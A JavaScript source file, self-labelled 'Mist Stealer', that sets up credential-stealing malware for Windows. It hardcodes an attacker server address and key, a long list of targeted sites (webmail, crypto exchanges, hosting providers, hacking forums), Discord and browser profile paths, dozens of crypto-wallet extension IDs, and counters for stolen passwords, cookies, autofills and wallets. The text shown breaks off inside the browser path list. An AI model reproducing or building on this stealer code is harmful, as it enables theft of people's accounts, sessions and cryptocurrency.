const fs = require('fs');
const util = require('util');
const path = require('path');
const axios = require('axios');
const os = require('os');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const child_process = require('child_process');
const { execSync, exec, spawn } = require('child_process');
const crypto = require('crypto');
const sqlite3 = require('sqlite3');
const { Dpapi } = require('@primno/dpapi');
const WebSocket = require('ws');
const http = require('http');
const puppeteer = require('puppeteer');
const PathModule = require('path');

const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []
    const randomString = crypto.randomBytes(3).toString('hex');

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;

const key = "4eb0f03e607b11d47fb2425ed450f122"
const api_url = "http://213.142.159.241";
const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "kick.com", "yemeksepeti.com", "gameforge.com", "gameforge.com", "nttgame.com", "nttgame", "epinsultan", "bet", "bahis.com", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "pornhubpremium.com", "itemsatis.com", "twitch.tv"];
let paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',

    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',

    ...Array(80).fill().map((_, i) => localappdata + `\\Google\\Chrome\\User Data\\Profile ${i + 1}\\`),
    ...Array(80).fill().map((_, i) => localappdata + `\\Google\\Chrome\\User Data\\Profile ${i + 1}\\Network\\`),

    appdata + '\\Opera Software\\Opera Stable\\Default\\',
    ...Array(80).fill().map((_, i) => appdata + `\\Opera Software\\Opera Stable\\Profile ${i + 1}\\`),
    appdata + '\\Opera Software\\Opera GX Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\Default\\',

    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',

    ...Array(80).fill().map((_, i) => localappdata + `\\BraveSoftware\\Brave-Browser\\User Data\\Profile ${i + 1}\\`),
    ...Array(80).fill().map((_, i) => localappdata + `\\BraveSoftware\\Brave-Browser\\User Data\\Profile ${i + 1}\\Network\\`),

    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',

    ...Array(80).fill().map((_, i) => localappdata + `\\Yandex\\YandexBrowser\\User Data\\Profile ${i + 1}\\`),
    ...Array(80).fill().map((_, i) => localappdata + `\\Yandex\\YandexBrowser\\User Data\\Profile ${i + 1}\\Network\\`),

    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\',

    ...Array(80).fill().map((_, i) => localappdata + `\\Microsoft\\Edge\\User Data\\Profile ${i + 1}\\`),
    ...Array(80).fill().map((_, i) => localappdata + `\\Microsoft\\Edge\\User Data\\Profile ${i + 1}\\Network\\`)
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(5).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[Mist Stealer]>================>\n\n',
    url: null,
}

const wallets = {
  Trust: '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph',
  Metamask: '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn',
  Coinbase: '\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad',
  BinanceChain: '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp',
  Phantom: '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa',
  TronLink: '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec',
  Ronin: '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec',
  Exodus: '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno',
  Coin98: '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg',
  Authenticator: '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai',
  MathWallet: '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc',
  YoroiWallet: '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb',
  GuardaWallet: '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln',
  JaxxxLiberty: '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne',
  Wombat: '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih',
  EVERWallet: '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk',
  KardiaChain: '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk',
  XDEFI: '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf',
  Nami: '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo',
  TerraStation: '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp',
  MartianAptos: '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk',
  TON: '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd',
  Keplr: '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap',
  CryptoCom: '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj',
  PetraAptos: '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci',
  OKX: '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge',
  Sollet: '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno',
  Sender: '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg',
  Sui: '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil',
  SuietSui: '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd',
  Braavos: '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma',
  FewchaMove: '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj',
  EthosSui: '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli',
  ArgentX: '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb',
  NiftyWallet: '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid',
  BraveWallet: '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl',
  EqualWallet: '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac',
  BitAppWallet: '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi',
  iWallet: '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj',
  AtomicWallet: '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh',
  MewCx: '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm',
  GuildWallet: '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj',
  SaturnWallet: '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig',
  HarmonyWallet: '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib',
  PaliWallet: '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn',
  BoltX: '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca',
  LiqualityWallet: '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn',
  MaiarDeFiWallet: '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm',
  TempleWallet: '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc',
  Metamask_E: '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm',
  Ronin_E: '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk',
  Yoroi_E: '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb',
  Authenticator_E: '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio',
  MetaMask_O: '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci',
};


browserPath = [
    [user.local + '\\Google\\Chrome\\User Data\\Default\\', 'Default', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 6\\', 'Profile_6', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 7\\', 'Profile_7', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 8\\', 'Profile_8', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 9\\', 'Profile_9', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 10\\', 'Profile_10', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 11\\', 'Profile_11', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 12\\', 'Profile_12', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 13\\', 'Profile_13', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 14\\', 'Profile_14', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 15\\', 'Profile_15', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 16\\', 'Profile_16', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 17\\', 'Profile_17', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 18\\', 'Profile_18', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 19\\', 'Profile_19', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 20\\', 'Profile_20', user.local + '\\Google\\Chrome\\User Data\\'],
    [user.local + '\\Google\\Chrome\\User Data\\Profile 21\\', 'Profile_21', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 22\\', 'Profile_22', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 23\\', 'Profile_23', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 24\\', 'Profile_24', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 25\\', 'Profile_25', user.local + '\\Google\\Chrome\\User Data\\'],
        [user.local + '\\Google\\Chrome\\User Data\\Profile 26\\', 'Profile_26', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 27\\', 'Profile_27', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 28\\', 'Profile_28', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 29\\', 'Profile_29', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 30\\', 'Profile_30', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 31\\', 'Profile_31', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 32\\', 'Profile_32', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 33\\', 'Profile_33', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 34\\', 'Profile_34', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 35\\', 'Profile_35', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 36\\', 'Profile_36', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 37\\', 'Profile_37', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 38\\', 'Profile_38', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 39\\', 'Profile_39', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 40\\', 'Profile_40', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 41\\', 'Profile_41', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 42\\', 'Profile_42', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 43\\', 'Profile_43', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 44\\', 'Profile_44', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 45\\', 'Profile_45', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 46\\', 'Profile_46', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 47\\', 'Profile_47', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 48\\', 'Profile_48', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 49\\', 'Profile_49', user.local + '\\Google\\Chrome\\User Data\\'],
[user.local + '\\Google\\Chrome\\User Data\\Profile 50\\', 'Profile_50', user.local + '\\Google\\Chrome\\User Data\\'],

    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', 'Default', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 6\\', 'Profile_6', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 7\\', 'Profile_7', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 8\\', 'Profile_8', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 9\\', 'Profile_9', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 10\\', 'Profile_10', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 11\\', 'Profile_11', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 12\\', 'Profile_12', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 13\\', 'Profile_13', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 14\\', 'Profile_14', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 15\\', 'Profile_15', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 16\\', 'Profile_16', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 17\\', 'Profile_17', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 18\\', 'Profile_18', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 19\\', 'Profile_19', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 20\\', 'Profile_20', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 21\\', 'Profile_21', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 22\\', 'Profile_22', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 23\\', 'Profile_23', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 24\\', 'Profile_24', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 25\\', 'Profile_25', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 26\\', 'Profile_26', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 27\\', 'Profile_27', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 28\\', 'Profile_28', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 29\\', 'Profile_29', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 30\\', 'Profile_30', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 31\\', 'Profile_31', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 32\\', 'Profile_32', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 33\\', 'Profile_33', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 34\\', 'Profile_34', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 35\\', 'Profile_35', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 36\\', 'Profile_36', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 37\\', 'Profile_37', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 38\\', 'Profile_38', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 39\\', 'Profile_39', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 40\\', 'Profile_40', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 41\\', 'Profile_41', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 42\\', 'Profile_42', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 43\\', 'Profile_43', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 44\\', 'Profile_44', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 45\\', 'Profile_45', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 46\\', 'Profile_46', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 47\\', 'Profile_47', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 48\\', 'Profile_48', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 49\\', 'Profile_49', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
[user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 50\\', 'Profile_50', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\', 'Default', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', 'Guest Profile', user.local + '\\Yandex\\YandexBrowser\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Default\\', 'Default', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\', 'Profile_1', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\', 'Profile_2', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\', 'Profile_3', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\', 'Profile_4', user.local + '\\Microsoft\\Edge\\User Data\\'],
    [user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\', 'Profile_5', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 6\\', 'Profile_6', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 7\\', 'Profile_7', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 8\\', 'Profile_8', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 9\\', 'Profile_9', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 10\\', 'Profile_10', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 11\\', 'Profile_11', user.local + '\\Microsoft\\Edge\\User Data\\'],
[user.local + '\\Microsoft\\Edge\\User Data\\Profile 12\\', 'Profile_12', user.local + '\\Microsoft\\Edge\\User Data\\'],
